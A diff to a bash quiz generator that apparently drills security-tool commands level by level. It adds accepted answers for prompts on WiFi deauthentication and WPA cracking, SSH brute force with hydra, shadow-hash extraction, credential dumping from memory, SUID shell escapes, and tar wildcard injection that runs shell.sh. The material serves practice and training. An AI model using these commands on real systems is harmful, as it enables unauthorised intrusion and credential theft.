@@ -2359,7 +2359,7 @@ gen_level26() {
   questions+=("Send ${W}5${C} deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon|aireplay-ng --deauth 5 -a ${mac} ${wiface}mon|sudo aireplay-ng -0 5 -a ${mac} ${wiface}mon|sudo aireplay-ng --deauth 5 -a ${mac} ${wiface}mon|aireplay-ng -a ${mac} -0 5 ${wiface}mon|sudo aireplay-ng -a ${mac} -0 5 ${wiface}mon|aireplay-ng -a ${mac} --deauth 5 ${wiface}mon|sudo aireplay-ng -a ${mac} --deauth 5 ${wiface}mon")
   questions+=("Crack WPA handshake in ${W}capture-01.cap${C} using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap|sudo aircrack-ng -w ${wordlist} capture-01.cap|aircrack-ng capture-01.cap -w ${wordlist}|sudo aircrack-ng capture-01.cap -w ${wordlist}")
   questions+=("WPS pixie-dust attack on AP ${W}${mac}${C}|reaver -i ${wiface}mon -b ${mac} -K 1|sudo reaver -i ${wiface}mon -b ${mac} -K 1|reaver -i ${wiface}mon -b ${mac} --pixie-dust|sudo reaver -i ${wiface}mon -b ${mac} --pixie-dust|bully -b ${mac} -d ${wiface}mon|sudo bully -b ${mac} -d ${wiface}mon")
-  questions+=("Clientless PMKID-only capture from ${W}${mac}${C}|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng")
+  questions+=("Clientless PMKID-only capture from ${W}${mac}${C}|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} --filtermode=2 -o pmkid.pcapng|hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng|sudo hcxdumptool -i ${wiface}mon --filterlist_ap=${mac} -o pmkid.pcapng")
   questions+=("Wireshark/tshark filter: only EAPOL frames in ${W}${pcap}${C}|tshark -r ${pcap} -Y eapol|tshark -r ${pcap} -Y 'eapol'|tshark -r ${pcap} -Y eapol -w eapol.pcapng")
   questions+=("Wireshark/tshark filter: beacon frames (subtype 8) in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'wlan.fc.type_subtype == 8'|tshark -r ${pcap} -Y 'wlan.fc.type_subtype==8'")
   questions+=("Channel-hop scan across all bands (a/b/g)|airodump-ng --band abg ${wiface}mon|sudo airodump-ng --band abg ${wiface}mon|airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon|sudo airodump-ng -C 1,6,11,36,40,44,48 ${wiface}mon")
@@ -2376,8 +2376,8 @@ gen_level26() {
   questions+=("Block radio with rfkill|rfkill block wifi|sudo rfkill block wifi|rfkill block all|sudo rfkill block all")
   questions+=("Unblock all radios|rfkill unblock all|sudo rfkill unblock all|rfkill unblock wifi|sudo rfkill unblock wifi")
   questions+=("Scan 433 MHz devices (RTL-SDR)|rtl_433|rtl_433 -F json|sudo rtl_433")
-  questions+=("Scan for nearby classic Bluetooth (BR/EDR) devices|hcitool scan|sudo hcitool scan|bluetoothctl scan bredr|sudo bluetoothctl scan bredr")
-  questions+=("Scan for nearby Bluetooth Low Energy (BLE) devices|hcitool lescan|sudo hcitool lescan|bluetoothctl --timeout 10 scan le|sudo bluetoothctl --timeout 10 scan le|bluetoothctl scan le|sudo bluetoothctl scan le")
+  questions+=("Scan for nearby classic Bluetooth (BR/EDR) devices|bluetoothctl scan bredr|sudo bluetoothctl scan bredr|hcitool scan|sudo hcitool scan")
+  questions+=("Scan for nearby Bluetooth Low Energy (BLE) devices|bluetoothctl scan le|sudo bluetoothctl scan le|bluetoothctl --timeout 10 scan le|sudo bluetoothctl --timeout 10 scan le|hcitool lescan|sudo hcitool lescan")
   questions+=("Bettercap WiFi recon module|bettercap -iface ${wiface} -eval 'wifi.recon on'|sudo bettercap -iface ${wiface} -eval 'wifi.recon on'")
 }
 
@@ -2399,7 +2399,7 @@ gen_level27() {
   questions+=("Show cracked passwords from john|john --show ${hash}")
   questions+=("List supported john formats|john --list=formats")
   questions+=("Extract hash from ${W}archive.zip${C} to ${W}hash.txt${C}|zip2john archive.zip > hash.txt|~^zip2john archive\.zip > .+$")
-  questions+=("Extract hash from ${W}document.pdf${C} to ${W}hash.txt${C}|pdf2john document.pdf > hash.txt|~^pdf2john document\.pdf > .+$")
+  questions+=("Extract hash from ${W}document.pdf${C} to ${W}hash.txt${C}|pdf2john document.pdf > hash.txt|pdf2john.pl document.pdf > hash.txt|~^pdf2john(\.pl)? document\.pdf > .+$")
   questions+=("Extract hash from ${W}archive.rar${C} to ${W}hash.txt${C}|rar2john archive.rar > hash.txt|~^rar2john archive\.rar > .+$")
   questions+=("Extract hash from ${W}/etc/shadow${C} format|unshadow /etc/passwd /etc/shadow > hash.txt|sudo unshadow /etc/passwd /etc/shadow > hash.txt|~^(sudo )?unshadow /etc/passwd /etc/shadow > .+$")
   questions+=("Brute force SSH login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ssh|hydra -l ${user} -P ${wordlist} ssh://${ip}|hydra -P ${wordlist} -l ${user} ${ip} ssh|hydra -P ${wordlist} -l ${user} ssh://${ip}")
@@ -2454,9 +2454,9 @@ gen_level28() {
   questions+=("Analyze ${bin} with radare2|r2 -A ${bin}|radare2 -A ${bin}")
   questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}|r2 -qc \"aaa; pdf @main\" ${bin}|radare2 -qc 'aaa; pdf @main' ${bin}|radare2 -qc \"aaa; pdf @main\" ${bin}")
   questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}|r2 -qc \"aaa; afl\" ${bin}|radare2 -qc 'aaa; afl' ${bin}|radare2 -qc \"aaa; afl\" ${bin}")
-  questions+=("Scan ${bin} for embedded files|binwalk ${bin}|binwalk -B ${bin}|binwalk --signature ${bin}")
-  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}|binwalk --extract ${bin}")
-  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}|binwalk --entropy ${bin}")
+  questions+=("Scan ${bin} for embedded files|binwalk ${bin}|binwalk -B ${bin}|binwalk --signature ${bin}|binwalk signature ${bin}")
+  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}|binwalk --extract ${bin}|binwalk extract ${bin}")
+  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}|binwalk --entropy ${bin}|binwalk entropy ${bin}")
   local -a _MEM_IMGS=(memory.dmp pagefile.sys memdump.raw)
   _fpick _MEM_IMGS; local memimg=$REPLY
   questions+=("List processes from memory dump (volatility 3)|vol -f ${memimg} windows.pslist|vol3 -f ${memimg} windows.pslist|vol3.py -f ${memimg} windows.pslist|volatility3 -f ${memimg} windows.pslist")
@@ -2488,7 +2488,7 @@ gen_level28() {
   questions+=("Detect injected code in memory dump (vol3)|vol -f ${memimg} windows.malfind|vol3 -f ${memimg} windows.malfind|vol3.py -f ${memimg} windows.malfind|volatility3 -f ${memimg} windows.malfind")
   questions+=("Dump cached domain credentials from memory (vol3)|vol -f ${memimg} windows.cachedump|vol3 -f ${memimg} windows.cachedump|volatility3 -f ${memimg} windows.cachedump")
   questions+=("Dump LSA secrets from memory (vol3)|vol -f ${memimg} windows.lsadump|vol3 -f ${memimg} windows.lsadump|volatility3 -f ${memimg} windows.lsadump")
-  questions+=("Carve every artifact category from ${W}${img}${C} into output/|bulk_extractor -o output/ ${img}|bulk_extractor -o output/ -R ${img}|sudo bulk_extractor -o output/ ${img}")
+  questions+=("Carve every artifact category from ${W}${img}${C} into output/|bulk_extractor -o output/ ${img}|sudo bulk_extractor -o output/ ${img}")
   questions+=("Scan ${W}${dir}${C}/ recursively with YARA ruleset rules.yar|yara -r rules.yar ${dir}/|yara --recursive rules.yar ${dir}/|yara -r rules.yar ${dir}|yara --recursive rules.yar ${dir}")
   questions+=("Find CTF flags inside ${W}${bin}${C} (pattern flag{...})§strings ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings -a ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings ${bin} | grep -oP 'flag\\{[^}]+\\}'§rg -ao 'flag\\{[^}]+\\}' ${bin}")
   questions+=("Detect JPEG steganography (outguess/F5/JSteg) in ${W}${photo}${C}|stegdetect ${photo}|stegdetect -tjopi ${photo}")
@@ -2513,7 +2513,7 @@ gen_level29() {
   questions+=("Check ${W}.bash_history${C}|cat ~/.bash_history|history|less ~/.bash_history")
   questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name '*.pem' 2>/dev/null|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null|find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null|find / -name 'id_rsa*' 2>/dev/null|fd -H -g 'id_rsa*' /|fd --hidden -g 'id_rsa*' /|fd -H 'id_rsa' /|fd --hidden 'id_rsa' /")
   questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit|find . -exec /bin/bash -p \\; -quit|find . -exec /bin/sh -p \\;|find . -exec /bin/bash -p \\;|find . -exec sh -p \\; -quit|find . -exec bash -p \\; -quit|find . -exec sh -p \\;|find . -exec bash -p \\;")
-  questions+=("SUID vim shell escape|vim -c ':!/bin/sh -p'|vim -c ':!/bin/bash -p'|vi -c ':!/bin/sh -p'|vi -c ':!/bin/bash -p'|vim -c ':!sh -p'|vim -c ':!bash -p'|vi -c ':!sh -p'|vi -c ':!bash -p'")
+  questions+=("SUID vim shell escape|vim -c ':!/bin/sh -p'|vim -c ':!/bin/bash -p'|vi -c ':!/bin/sh -p'|vi -c ':!/bin/bash -p'|vim -c ':!sh -p'|vim -c ':!bash -p'|vi -c ':!sh -p'|vi -c ':!bash -p'|vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'|vim -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'")
   questions+=("SUID python3 shell|python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'|python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'|python3 -c 'import pty; pty.spawn(\"/bin/sh\")'|python3 -c 'import pty; pty.spawn(\"/bin/bash\")'|python3 -c 'import os;os.system(\"/bin/sh -p\")'|python3 -c 'import os;os.system(\"/bin/bash -p\")'|python -c 'import pty; pty.spawn(\"/bin/sh\")'|python -c 'import pty; pty.spawn(\"/bin/bash\")'")
   questions+=("Sudo env privesc|sudo env /bin/sh|sudo env /bin/bash|sudo env sh|sudo env bash|sudo /usr/bin/env /bin/sh|sudo /usr/bin/env /bin/bash")
   questions+=("Check kernel exploits (searchsploit, strip arch suffix)§searchsploit linux kernel \$(uname -r | cut -d- -f1)§searchsploit linux kernel | grep \$(uname -r | cut -d- -f1)§searchsploit -m linux/local/ kernel \$(uname -r | cut -d- -f1)")
@@ -2543,7 +2543,7 @@ gen_level29() {
   questions+=("Stabilize a dumb reverse shell to a full TTY§python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm && stty raw -echo; fg§python3 -c 'import pty;pty.spawn(\"/bin/bash\")'§python -c 'import pty;pty.spawn(\"/bin/bash\")'§script -qc /bin/bash /dev/null")
   questions+=("Triage linpeas output for high-confidence (95-99%) findings§./linpeas.sh | grep -E '\\[95%|\\[97%|\\[99%'§bash linpeas.sh | grep -iE '95%|99%|CVE-[0-9]'§linpeas.sh 2>/dev/null | grep -E '\\[95\\]|\\[97\\]|\\[99\\]'")
   questions+=("Find writable systemd service files|find /etc/systemd/system /lib/systemd/system -writable -name '*.service' 2>/dev/null|find /etc/systemd/system -perm -o+w -name '*.service' 2>/dev/null|find /etc/systemd/system /usr/lib/systemd/system -writable -name '*.service' 2>/dev/null")
-  questions+=("Tar wildcard injection: drop checkpoint files in cwd before cron tar runs§echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'§printf '' > '--checkpoint=1'; printf '' > '--checkpoint-action=exec=sh shell.sh'§touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'")
+  questions+=("Tar wildcard injection: drop checkpoint files in cwd before cron tar runs§touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'§echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'§printf '' > '--checkpoint=1'; printf '' > '--checkpoint-action=exec=sh shell.sh'")
 }
 
 # Level 30: ROOT
